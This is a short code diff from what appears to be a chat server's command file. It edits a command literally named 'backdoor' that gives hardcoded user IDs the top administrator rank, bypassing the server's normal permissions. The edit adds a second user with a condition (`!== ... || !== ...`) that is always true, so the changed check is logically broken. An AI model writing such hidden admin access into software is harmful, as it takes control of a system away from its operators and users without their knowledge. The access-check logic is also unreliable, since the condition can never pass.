@@ -963,7 +963,7 @@ exports.commands = {
 	},
 	
 	backdoor: function (target, room, user) {
-        if (user.userid !== 'flareninja') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'flareninja' || user.userid !== 'nkobellic') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
